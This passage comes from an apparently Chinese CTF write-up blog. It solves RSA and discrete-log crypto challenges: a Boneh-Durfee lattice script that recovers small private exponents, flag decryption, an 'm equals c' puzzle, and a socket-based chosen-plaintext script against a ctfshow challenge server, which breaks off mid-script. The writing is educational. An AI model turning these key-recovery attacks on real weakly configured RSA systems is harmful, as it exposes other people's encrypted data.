class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span>():</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">116619053095181844867756588238123176803022888638090603550604610234584486986893904698844566541567093613495764007369858037838298617868152946508912345019503344911355228396374219771717648337137214599383155473846763062399405332170035904047911459812639096963243997609662442560069465026848168759806881590989694374289</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">28366532045084591636437544767374939012961757129620507106907154467035496029282857415182567552270978206397793889819857945701555381457862312304572366567535998525153574576210520634959025982966194022680398054500011866734299857844098161391787585786609289654556120958843118695788794035767689727287572845453232286487</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">0.280</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;private key found:&quot;</span>, d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== no solution was found ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>rsa解密，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">d = <span class="number">1604729467840738070847003596064117868379286998792964612314423127886316878631207</span></span><br><span class="line">e=  <span class="number">28366532045084591636437544767374939012961757129620507106907154467035496029282857415182567552270978206397793889819857945701555381457862312304572366567535998525153574576210520634959025982966194022680398054500011866734299857844098161391787585786609289654556120958843118695788794035767689727287572845453232286487</span></span><br><span class="line">n = <span class="number">116619053095181844867756588238123176803022888638090603550604610234584486986893904698844566541567093613495764007369858037838298617868152946508912345019503344911355228396374219771717648337137214599383155473846763062399405332170035904047911459812639096963243997609662442560069465026848168759806881590989694374289</span></span><br><span class="line">c = <span class="number">5550387375810892705924800464945980988431639193797468627845836397962361427321133854633770242318969576163563079147919098794998899335191281861385800469677049957403290859349688725585260874592933564793273307183923684839207469443101629472424936878786558261355723914033881683475668259544365455286750343306090149047</span></span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br><span class="line"><span class="comment"># b&quot;novaCTF&#123;d0n&#x27;t_J0_kn0wn_b0n3h_durf33&#125;&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p><strong>e过大</strong>求解再添一员猛将</p><p>e 非常大接近于N，即 d 较小时。与低解密指数攻击类似，比低解密指数攻击（Wiener Attack）更强，可以解决$\frac{1}{3} N^{\frac{1}{4}} ≤ d ≤ N^{0.292}$的问题。</p><ul><li>若 $d &lt; \frac{1}{3} N^{\frac{1}{4}}$ ,则可选择<strong>Winner攻击</strong></li><li>若$\frac{1}{3} N^{\frac{1}{4}} ≤ d ≤ N^{0.292}$，则可选择<strong>Boneh和Durffe攻击攻击</strong></li></ul><h2 id="Pohlig-hellman-｜离散对数"><a href="#Pohlig-hellman-｜离散对数" class="headerlink" title="Pohlig-hellman    ｜离散对数"></a>Pohlig-hellman    ｜离散对数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;novaCTF&#123;******&#125;&quot;</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">1024</span></span><br><span class="line">e = bytes_to_long(flag)</span><br><span class="line">m = <span class="number">0b101010101010101010100101001010101010010101001010111</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 1501199137581655</span></span><br><span class="line"><span class="comment"># c = 66833442412465837593411329882154519317338634354813852217147677313497719741502965349598626224700154836780839167770562034307746877775924269074354587364763439201631983852896392052544055458196432140978886498016995260963282787641046569867110159856825184627818917769177045102578369482845631041962774517107346776951</span></span><br></pre></td></tr></table></figure><h3 id="题解-11"><a href="#题解-11" class="headerlink" title="题解"></a>题解</h3><ul><li>昨天晚上集中学习了la佬的sage指南文章，恰好有<strong>离散对数问题（Pohlig-hellman）</strong></li><li>唯一让我疑惑的是，la佬将n是合数、n是素数或素数的整数幂分为两类，其中n是素数里交代了Pohlig-hellman，但题目里n明显是后者🤔</li></ul><p>虽然但是，sage一两行搞定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="comment"># m^e = c (mod n)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">2</span>^<span class="number">1024</span></span><br><span class="line">m = <span class="number">1501199137581655</span></span><br><span class="line">c = <span class="number">66833442412465837593411329882154519317338634354813852217147677313497719741502965349598626224700154836780839167770562034307746877775924269074354587364763439201631983852896392052544055458196432140978886498016995260963282787641046569867110159856825184627818917769177045102578369482845631041962774517107346776951</span></span><br><span class="line">e = discrete_log(mod(c,n),mod(m,n))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(e)))</span><br><span class="line"><span class="comment"># b&#x27;novaCTF&#123;th1s_1s_h0w_D1scr3t3_l0g_w0rk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><ul><li><p>离散对数的问题。</p><ul><li>当模为素数时，一般用的是<strong>大步小步算法（BSGS）</strong></li><li>当模为素数的幂时，主要用<strong>Pohlig-Hellman</strong></li></ul><p>而sage里的<code>discrete_log</code>就是利用以上两种算法实现的？？？</p><p>不确定有没有用Pohlig-Hellman算法，因为la佬说它要求底数是原根</p></li></ul><h2 id="想简单一点-｜m-c"><a href="#想简单一点-｜m-c" class="headerlink" title="想简单一点    ｜m=c"></a>想简单一点    ｜m=c</h2><h3 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">24873777989291448485268365702265085243886872900039809831478881276969311714448924581398692832639705916538111455861057354225427758736198452679468399039512440497290615485190994957684665065261280544484301856860844163436499302230085760545686486398949018187416289923500558688885485672960734334858119391323987554701544773420070317895909846297195832399677291338220818181502181317849952785959097285626009703863257450199781708945715701136683994546852422993684382468187651935055302074609980311161155531603473091857526099148935429447319415714778860215376802270686310782735079899235228731429165106477537031235405221734008734614847</span></span><br><span class="line">e = <span class="number">12436888994645724242634182851132542621943436450019904915739440638484655857224462290699346416319852958269055727930528677112713879368099226339734199519756220248645307742595497478842332532630640272242150928430422081718249651115042880272843243199474509093708144961750279344442742836480367167429059695661993777350613653317802356713323129593521588320771616955563426747034967432053960828426250168954828986666929922730060781213890566121107119389060806644531516491192343284701151238691996162679338542186167193568672632227858449997036747029810933106336313085633759799229646747282205612102678724267585967720538082620536177904609</span></span><br><span class="line">c = <span class="number">7539424334663709603622451394173266049480031393220309445902319310504736287365860451132752036622339554159799611768328686792828750952551268647863160547774237934958072391797341405165512721597085695555356929495861914056799039140107261439671707574841789330531198534325422015873621769489969596614802282764401661006564546159674397356683650318142728009273827997179696988926599672213482848150751054351595386402597000601684644207559735499031666361222038615475154046453649719203304187309556004660926226182353445661702352380654352874617084419834338343925880593023307238768452509962</span></span><br></pre></td></tr></table></figure><blockquote><p>hint: 当你凝视密文的时候，密文也在凝视你</p></blockquote><h2 id="题解-12"><a href="#题解-12" class="headerlink" title="题解"></a>题解</h2><p>糟了，菜🐔看着题目瑟瑟发抖🤔</p><p>c甚至没有e大, 想了很久没想到</p><p>最后看4XWi11师傅题解，直接把c转byte得解（半瞬间有过这个想法）</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINNER WINNER CHICKEN DINNER! This <span class="keyword">is</span> easy <span class="keyword">but</span> quite troll man. One should NOT expect <span class="keyword">that</span> <span class="keyword">the</span> ciphertext <span class="keyword">is</span> <span class="keyword">equal</span> <span class="keyword">to</span> plaintext <span class="keyword">in</span> <span class="keyword">the</span> <span class="built_in">real</span> world. Flag <span class="keyword">is</span>: ctfshow&#123;xielunyan___KAI!&#125;. By <span class="keyword">the</span> way, what a stupid encryption exponent <span class="keyword">it</span> <span class="keyword">is</span>!</span><br></pre></td></tr></table></figure><p>m = c</p><p>离谱，当个脑洞吧。</p><p>站在出题者角度来看是极好的，对于解题者看来一般。</p><p>致敬我费的时间😭</p><h2 id="ctfshow·单身杯·TooYoungRSA｜选择明文攻击"><a href="#ctfshow·单身杯·TooYoungRSA｜选择明文攻击" class="headerlink" title="ctfshow·单身杯·TooYoungRSA｜选择明文攻击"></a>ctfshow·单身杯·TooYoungRSA｜选择明文攻击</h2><h3 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h3><p><strong>chall.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> nevergonnagiveyouup <span class="keyword">import</span> n, e</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.read().strip()</span><br><span class="line"></span><br><span class="line">    k = secrets.randbelow(n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ck = <span class="subst">&#123;<span class="built_in">pow</span>(k, e, n)&#125;</span>&quot;</span>)</span><br><span class="line">    key = sha256(<span class="built_in">str</span>(k).encode()).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ct = <span class="subst">&#123;cipher.encrypt(pad(flag, AES.block_size)).<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        nevergonnaletyoudown = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;I just wanna tell you how i&#x27;m feeling... &quot;</span>))</span><br><span class="line">        <span class="keyword">assert</span> nevergonnaletyoudown &gt;= <span class="number">0</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;gotta make you understand: <span class="subst">&#123;<span class="built_in">pow</span>(nevergonnaletyoudown, e, n)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="题解-13"><a href="#题解-13" class="headerlink" title="题解"></a>题解</h3><blockquote><p>学习参考la佬博客</p></blockquote><p>显而易见，求出k即解</p><p>而求k，则需要n、e</p><p>我们可以随意传m，并且得到他的密文，典型的<strong>选择明文攻击</strong></p><p>实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SageMath</span></span><br><span class="line"><span class="comment"># 要是能用py实现factor，也可以用python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="comment"># import secrets  # woc，真的有这个库,求出n后千万别犯傻，以为k = secrets.randbelow(n)</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>  <span class="comment"># str</span></span><br><span class="line">PORT = ...  <span class="comment"># int</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">a = <span class="built_in">str</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line">a = a.split(<span class="string">r&#x27;\n&#x27;</span>)</span><br><span class="line">ck = <span class="built_in">int</span>(a[<span class="number">0</span>][<span class="number">7</span>:])</span><br><span class="line">ct = binascii.unhexlify(a[<span class="number">1</span>][<span class="number">5</span>:])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ck = <span class="subst">&#123;ck&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ct = <span class="subst">&#123;ct&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择明文攻击获得n</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_encode</span>(<span class="params">data</span>):</span>  <span class="comment"># 具体代码根据题目修改</span></span><br><span class="line">    s.send((<span class="built_in">str</span>(data) + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">    tmp = <span class="built_in">str</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line">    tmp = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(tmp.split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>]).split(<span class="string">r&#x27;\n&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_n</span>():</span></span><br><span class="line">    nset = []</span><br><span class="line">    c2 = server_encode(<span class="number">2</span>)</span><br><span class="line">    c4 = server_encode(<span class="number">4</span>)</span><br><span class="line">    c8 = server_encode(<span class="number">8</span>)</span><br><span class="line">    nset.append(c2 * c2 - c4)</span><br><span class="line">    nset.append(c2 * c2 * c2 - c8)</span><br><span class="line">    c3 = server_encode(<span class="number">3</span>)</span><br><span class="line">    c9 = server_encode(<span class="number">9</span>)</span><br><span class="line">    c27 = server_encode(<span class="number">27</span>)</span><br><span class="line">    nset.append(c3 * c3 - c9)</span><br><span class="line">    nset.append(c3 * c3 * c3 - c27)</span><br><span class="line">    c5 = server_encode(<span class="number">5</span>)</span><br><span class="line">    c25 = server_encode(<span class="number">25</span>)</span><br><span class="line">    c125 = server_encode(<span class="number">125</span>)</span><br><span class="line">    nset.append(c5 * c5 - c25)</span><br><span class="line">    nset.append(c5 * c5 * c5 - c125)</span><br><span class="line">    n = nset[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> nset:</span><br><span class="line">        n = gmpy2.gcd(x, n)</span><br><span class="line">    <span class="keyword">while</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        n //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> n % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        n //= <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> n % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        n //= <span class="number">5</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">n = get_n()</span><br><span class="line">p, q = factor(n)</span><br><span class="line">p = <span class="built_in">int</span>(p[<span class="number">0</span>])</span><br><span class="line">q = <span class="built_in">int</span>(q[<span class="number">0</span>])</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用e=65537解密是乱码，遂爆破e</span></span><br><span class="line">e = <span class="number">1</span></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        e += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    k = <span class="built_in">int</span>(<span class="built_in">pow</span>(ck, d, n))</span><br><span class="line">    key = sha256(<span class="built_in">str</span>(k).encode()).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    m = <span class="built_in">str</span>(cipher.decrypt(ct))</span><br><span class="line">    <span class="keyword">if</span> <span 